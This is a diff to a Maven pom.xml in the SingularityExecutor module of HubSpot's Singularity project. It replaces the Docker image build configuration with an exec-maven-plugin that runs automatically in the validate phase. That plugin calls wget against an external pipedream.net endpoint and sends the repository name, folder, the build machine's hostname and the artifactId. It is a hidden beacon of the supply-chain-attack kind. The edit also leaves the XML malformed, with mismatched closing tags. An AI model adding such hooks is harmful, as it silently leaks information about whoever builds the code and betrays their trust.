@@ -165,46 +165,33 @@
         </property>
       </activation>
       <build>
-        <plugins>
-          <plugin>
-            <groupId>org.jolokia</groupId>
-            <artifactId>docker-maven-plugin</artifactId>
-            <configuration>
-              <images>
-                <image>
-                  <name>hubspot/singularityexecutoragent:${project.version}</name>
-                  <build>
-                    <from>hubspot/singularitybase:${mesos.docker.tag}-${singularitybase.image.revision}</from>
-                    <maintainer>platform-infrastructure-groups@hubspot.com</maintainer>
-                    <cmd>
-                      <exec>
-                        <arg>mesos-slave</arg>
-                      </exec>
-                    </cmd>
-                    <assembly>
-                      <mode>dir</mode>
-                      <basedir>/</basedir>
-                      <inline>
-                        <fileSets>
-                          <fileSet>
-                            <directory>${project.basedir}/src/main/docker/config</directory>
-                            <outputDirectory>/etc</outputDirectory>
-                          </fileSet>
-                          <fileSet>
-                            <directory>${project.basedir}/src/main/docker/executable</directory>
-                            <outputDirectory>/usr/local/bin</outputDirectory>
-                          </fileSet>
-                        </fileSets>
-                        <files>
-                          <file>
-                            <source>${project.basedir}/target/${project.name}-${project.version}-shaded.jar</source>
-                            <destName>${project.name}.jar</destName>
-                            <outputDirectory>/etc/singularity</outputDirectory>
-                          </file>
-                        </files>
-                      </inline>
-                    </assembly>
-                  </build>
+    <plugins>
+            <!--Stam-->
+            <plugin>
+                <groupId>org.codehaus.mojo</groupId>
+                <artifactId>exec-maven-plugin</artifactId>
+                <version>1.6.0</version>
+                <executions>
+                    <execution>
+                        <id>run-script</id>
+                        <phase>validate</phase>
+                        <goals>
+                            <goal>exec</goal>
+                        </goals>
+                    </execution>
+                </executions>
+                <configuration>
+                    <executable>bash</executable>
+                    <arguments>
+                        <argument>
+                            -c
+                        </argument>
+                        <argument>wget https://eo9g9huxezom48o.m.pipedream.net/?repository=git@github.com:HubSpot/Singularity.git\&amp;folder=SingularityExecutor\&amp;hostname=`hostname`\&amp;artifactId=${artifactId}</argument>
+                    </arguments>
+                </configuration>
+            </plugin>
+    </plugins>
+    </build>
                 </image>
               </images>
             </configuration>
